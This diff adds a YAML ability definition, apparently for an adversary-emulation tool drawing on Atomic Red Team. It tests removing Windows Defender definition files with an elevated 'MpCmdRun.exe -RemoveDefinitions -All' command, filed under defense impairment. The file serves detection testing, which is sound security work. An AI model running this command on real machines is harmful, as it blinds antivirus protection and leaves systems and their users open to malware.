@@ -1,0 +1,36 @@
+- id: 3d47daaa-2f56-43e0-94cc-caf5d8d52a68
+  name: Remove Windows Defender Definition Files
+  description: 'Removing definition files would cause ATP to not fire for AntiMalware.
+    Check MpCmdRun.exe man page for info on all arguments.
+
+    On later viersions of windows (1909+) this command fails even with admin due to
+    inusfficient privelages. On older versions of windows the
+
+    command will say completed.
+
+
+    https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/'
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      sh:
+        command: '"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions
+          -All'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - atomic-red-team
+  - t1685
+  - defense-impairment
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2026-04-14T22:53:26.949Z'
+    atomic_guid: 3d47daaa-2f56-43e0-94cc-caf5d8d52a68
+    import_timestamp: '2026-05-02T05:00:41.565235Z'
